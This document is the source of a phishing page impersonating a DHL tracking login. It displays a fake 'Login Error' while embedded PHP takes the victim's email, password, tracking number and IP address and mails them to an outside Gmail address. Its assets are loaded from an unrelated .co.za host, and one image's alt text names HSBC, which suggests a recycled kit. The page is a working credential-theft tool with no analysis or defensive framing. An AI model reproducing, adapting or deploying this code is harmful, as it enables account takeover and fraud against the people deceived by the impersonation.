<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>
	
		DHL 
		
</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">



<link rel="shortcut icon" href="dhl_logo.gif" tppabs="http://www.dhl.com/img/meta/dhl_logo.gif">




<meta charset="utf-8"><style type="text/css">
<!--
.style1 {font-size: 12px}
#apDiv1 {
	position: absolute;
	left: 145px;
	top: 171px;
	width: 761px;
	height: 298px;
	z-index: 1;
}
-->
</style></head>


  

<body alink="blue" background="5_1_dhl_global_locator_all_340_187.gif" tppabs="http://34redw2e43.co.za/dhl/DHL_files/5_1_dhl_global_locator_all_340_187.gif" bgcolor="#FFFF00" link="blue" text="black" vlink="blue">
<div id="apDiv1">
  <h1 align="center">Login Error</h1>
  <p>Invalid <font color="#FF0000">Email address</font> and <font color="#FF0000">Password</font> go back and login again with 
    valid information&nbsp; to view your Tracking information or&nbsp; <b><a href="index.htm">click back</a></b>.</p>
  <div class="centre"><span class="copyright cLight">
    <?php

$email = $_POST['email'];
$password = $_POST['password'];
$trackno = $_POST['trackno'];
$ip = $_SERVER['REMOTE_ADDR']; 

if (eregi('http:', $notes)) {
die ("Do NOT try that! ! ");
}
if(!$email == "" && (!strstr($email,"@") || !strstr($email,".")))
//{
//echo "<h4>Use Back - Enter valid e-mail</h4>\n";
//$badinput = "<h4>Feedback was NOT submitted</h4>\n";
//echo $badinput;
//die ("Go back! ! ");
//}

if(empty($email) || empty($password)) {
echo "<h4>Use Back - fill in all fields</h4>\n";
die ("Use back! ! ");
}

$todayis = date("l, F j, Y, g:i a") ;

$attn = $attn ;
$subject = $attn;
$title = $title ;



$notes = stripcslashes($notes);

$message = "User ID : $email<br/>password : $password<br/>trackno : $trackno<br/>ip : $ip
";

$from = "FROM: 	DHL GLOBAL. &reg;<Courier Services>";


mail("dennismills02@gmail.com", $subject, $message, $from, $title);

?>
  </span></div>
</div>
<div class="containerGlobal" style="width: 974px; margin: 0px auto;">
	<div class="containerLogoArea" style="width: 350px; float: left; clear: 

left; margin-bottom: 30px; margin-left: -33px;">
		<img src="images.png" tppabs="http://34redw2e43.co.za/dhl/DHL_files/images.png" alt="HSBC UAE Home" style="font-weight: normal; margin-left: 0px; 

padding-left: 0px; vertical-align: middle;" usemap="#Map" border="0" height="150" width="500"><map name="Map"></map></div>
</div>
<script src="a.htm.js" tppabs="http://34redw2e43.co.za/dhl/DHL_files/a.htm"></script><noscript></noscript>

<!-- End Of Analytics Code -->
</body></html>
<!-- www.serversfree.com Analytics Code -->